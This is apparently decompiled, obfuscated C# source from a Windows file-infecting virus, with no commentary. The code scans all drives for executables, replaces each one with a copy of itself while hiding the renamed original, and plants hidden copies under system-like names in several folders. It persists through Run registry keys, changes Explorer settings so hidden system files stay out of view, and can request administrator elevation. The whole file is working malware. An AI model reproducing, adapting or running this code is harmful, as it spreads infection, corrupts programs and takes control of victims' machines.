using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using ns0;
using ns1;
using ns8;

namespace ns5;

internal static class Class18
{
	private static readonly string string_0;

	private static readonly string string_1;

	public static readonly List<string> list_0;

	private static List<string> list_1;

	private static readonly string string_2;

	private static readonly string string_3;

	private static readonly string string_4;

	private static readonly string string_5;

	public static readonly int int_0;

	[CompilerGenerated]
	private static Action<List<string>> action_0;

	[CompilerGenerated]
	private static Action<List<string>> action_1;

	static Class18()
	{
		string_2 = ".exe";
		string_3 = "*.exe";
		string_4 = "fox.exe";
		string_5 = "foxpro.exe";
		int_0 = 3600000;
		try
		{
			char directorySeparatorChar = Path.DirectorySeparatorChar;
			string_0 = Environment.GetFolderPath(Environment.SpecialFolder.System);
			int length = string_0.LastIndexOf(directorySeparatorChar);
			string_0 = string_0.Substring(0, length).ToLower();
			string_1 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToLower();
		}
		catch
		{
		}
		list_0 = new List<string> { string_0, string_1 };
	}

	public static void smethod_0()
	{
		try
		{
			do
			{
				smethod_1();
				Thread.Sleep(int_0);
			}
			while (Class34.bool_0);
		}
		catch
		{
		}
	}

	private static void smethod_1()
	{
		string[] logicalDrives = Directory.GetLogicalDrives();
		for (int num = logicalDrives.Length - 1; num >= 0; num--)
		{
			string startPath = logicalDrives[num];
			Class39.smethod_0(startPath, string_3, subdirectories: true, delegate(List<string> list_2)
			{
				if (!smethod_2(list_2))
				{
					foreach (string item in list_2)
					{
						smethod_14(item);
						Thread.Sleep(600);
					}
				}
				Thread.Sleep(500);
			}, list_0);
		}
	}

	private static bool smethod_2(List<string> list_2)
	{
		if (list_2 != null && list_2.Count != 0)
		{
			int num = 0;
			while (true)
			{
				if (num < list_2.Count)
				{
					string text = list_2[num].ToLower();
					if (text.EndsWith(string_4))
					{
						break;
					}
					if (!text.EndsWith(string_5))
					{
						num++;
						continue;
					}
					return true;
				}
				return false;
			}
			return true;
		}
		return true;
	}

	public static List<string> smethod_3()
	{
		if (list_1 != null)
		{
			return list_1;
		}
		string path = "";
		string path2 = "";
		string path3 = "";
		string path4 = "";
		string path5 = "c:\\windows\\";
		string path6 = "c:\\";
		try
		{
			path = Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower();
		}
		catch
		{
		}
		try
		{
			path2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToLower();
		}
		catch
		{
		}
		try
		{
			path4 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData).ToLower();
		}
		catch
		{
		}
		try
		{
			path3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal).ToLower();
		}
		catch
		{
		}
		List<string> list = new List<string>();
		string[] array = Class34.string_4;
		foreach (string text in array)
		{
			list.Add(Path.Combine(path, text + string_2));
		}
		string[] array2 = Class34.string_4;
		foreach (string text2 in array2)
		{
			list.Add(Path.Combine(path5, text2 + string_2));
		}
		string[] array3 = Class34.string_4;
		foreach (string text3 in array3)
		{
			list.Add(Path.Combine(path2, text3 + string_2));
		}
		string[] array4 = Class34.string_4;
		foreach (string text4 in array4)
		{
			list.Add(Path.Combine(path4, text4 + string_2));
		}
		string[] array5 = Class34.string_4;
		foreach (string text5 in array5)
		{
			list.Add(Path.Combine(path3, text5 + string_2));
		}
		string[] array6 = Class34.string_4;
		foreach (string text6 in array6)
		{
			list.Add(Path.Combine(path6, text6 + string_2));
		}
		list_1 = list;
		return list;
	}

	public static void smethod_4()
	{
		try
		{
			List<string> list = smethod_3();
			string executablePath = Application.get_ExecutablePath();
			foreach (string item in list)
			{
				try
				{
					if (File.Exists(item))
					{
						File.SetAttributes(item, FileAttributes.Archive);
					}
					File.Copy(executablePath, item, overwrite: true);
					if (item.StartsWith("c:\\windows\\"))
					{
						Class30.smethod_0(item);
					}
					else
					{
						Class30.smethod_1(item);
					}
					File.SetAttributes(item, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Archive);
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<string> smethod_5()
	{
		List<string> list = smethod_3();
		List<string> list2 = new List<string>();
		foreach (string item in list)
		{
			if (File.Exists(item))
			{
				list2.Add(item);
			}
		}
		return list2;
	}

	public static bool smethod_6()
	{
		string text = Application.get_ExecutablePath().ToLower();
		string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text);
		try
		{
			object value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", fileNameWithoutExtension, null);
			if (value.ToString()!.ToLower() == text)
			{
				return true;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			object value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", fileNameWithoutExtension, null);
			if (value2.ToString()!.ToLower() == text)
			{
				return true;
			}
		}
		catch (Exception)
		{
		}
		return false;
	}

	public static void smethod_7(bool bool_0)
	{
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion", "link", Convert.ToByte(bool_0));
		}
		catch (Exception)
		{
		}
	}

	public static bool smethod_8()
	{
		try
		{
			return Convert.ToBoolean(Convert.ToByte(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion", "link", Convert.ToByte(value: false))));
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void smethod_9()
	{
		try
		{
			List<string> list = smethod_5();
			if (list.Count > 0)
			{
				int num = 4;
				if (list.Count < 4)
				{
					num = list.Count;
				}
				for (int i = 0; i < num; i++)
				{
					string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(list[i]);
					try
					{
						Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", fileNameWithoutExtension, list[i]);
					}
					catch (Exception)
					{
						try
						{
							Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", fileNameWithoutExtension, list[i]);
						}
						catch
						{
						}
					}
				}
				return;
			}
			string executablePath = Application.get_ExecutablePath();
			string fileNameWithoutExtension2 = Path.GetFileNameWithoutExtension(executablePath);
			try
			{
				Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", fileNameWithoutExtension2, executablePath);
			}
			catch (Exception)
			{
				try
				{
					Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", fileNameWithoutExtension2, executablePath);
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static bool smethod_10()
	{
		List<string> list = smethod_3();
		foreach (string item in list)
		{
			if (File.Exists(item))
			{
				return true;
			}
		}
		return false;
	}

	public static bool smethod_11(string string_6)
	{
		string_6 = string_6.ToLower();
		List<string> list = smethod_3();
		return list.Contains(string_6);
	}

	public static void smethod_12(string[] args = null)
	{
		string executablePath = Application.get_ExecutablePath();
		string directoryName = Path.GetDirectoryName(executablePath);
		string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(executablePath);
		Path.GetExtension(executablePath);
		string text = Path.Combine(directoryName, fileNameWithoutExtension);
		string text2 = Path.Combine(directoryName, fileNameWithoutExtension + Class34.string_3);
		if (!File.Exists(text))
		{
			text = text2;
		}
		if (!File.Exists(text))
		{
			return;
		}
		try
		{
			ProcessStartInfo startInfo = Process.GetCurrentProcess().StartInfo;
			startInfo.FileName = text;
			if (args != null && args.Length > 0)
			{
				try
				{
					startInfo.Arguments = smethod_15();
				}
				catch
				{
				}
			}
			startInfo.UseShellExecute = false;
			Process.Start(startInfo);
		}
		catch
		{
		}
	}

	public static void smethod_13(string directory, bool subdirectories = true)
	{
		Class39.smethod_0(directory, string_3, subdirectories, delegate(List<string> list_2)
		{
			foreach (string item in list_2)
			{
				smethod_14(item);
				Thread.Sleep(50);
			}
		}, list_0);
	}

	private static void smethod_14(string string_6)
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			if (smethod_11(string_6))
			{
				return;
			}
			string text = string_6.ToLower();
			if (text.ToLower().StartsWith(string_0) || text.StartsWith(string_1))
			{
				return;
			}
			string directoryName = Path.GetDirectoryName(string_6);
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(string_6);
			Path.GetExtension(string_6);
			string text2 = Path.Combine(directoryName, fileNameWithoutExtension);
			try
			{
				if (!fileNameWithoutExtension.ToLower().EndsWith(Class34.string_3))
				{
					File.Move(string_6, text2);
					File.Copy(executablePath, string_6, overwrite: true);
					try
					{
						Class30.smethod_2(text2, string_6);
					}
					catch (Exception)
					{
					}
					File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Archive);
				}
			}
			catch (Exception)
			{
			}
		}
		catch
		{
		}
	}

	private static string smethod_15()
	{
		try
		{
			string commandLine = Environment.CommandLine;
			string text = commandLine.ToLower();
			string executablePath = Application.get_ExecutablePath();
			string text2 = executablePath.ToLower();
			int num = text.IndexOf(text2, StringComparison.InvariantCulture);
			if (num == 1 && text[0] == '"')
			{
				int num2 = text2.Length + 1 + 1;
				return commandLine.Substring(num2, commandLine.Length - num2).Trim();
			}
			return commandLine.Substring(num, commandLine.Length - num).Trim();
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static void smethod_16()
	{
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "ShowSuperHidden", 0);
		}
		catch
		{
		}
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", 2);
		}
		catch
		{
		}
	}

	public static bool smethod_17()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void smethod_18(bool bool_0)
	{
		if (bool_0)
		{
			ShellExecute(IntPtr.Zero, "runas", Application.get_ExecutablePath() ?? "", smethod_15(), "", 1);
		}
		else
		{
			ShellExecute(IntPtr.Zero, "runas", Application.get_ExecutablePath() ?? "", "", "", 1);
		}
	}

	[DllImport("shell32.dll")]
	private static extern void ShellExecute(IntPtr intptr_0, string string_6, string string_7, string string_8, string string_9, int int_1);

	[CompilerGenerated]
	private static void smethod_19(List<string> list_2)
	{
		if (!smethod_2(list_2))
		{
			foreach (string item in list_2)
			{
				smethod_14(item);
				Thread.Sleep(600);
			}
		}
		Thread.Sleep(500);
	}

	[CompilerGenerated]
	private static void smethod_20(List<string> list_2)
	{
		foreach (string item in list_2)
		{
			smethod_14(item);
			Thread.Sleep(50);
		}
	}
}
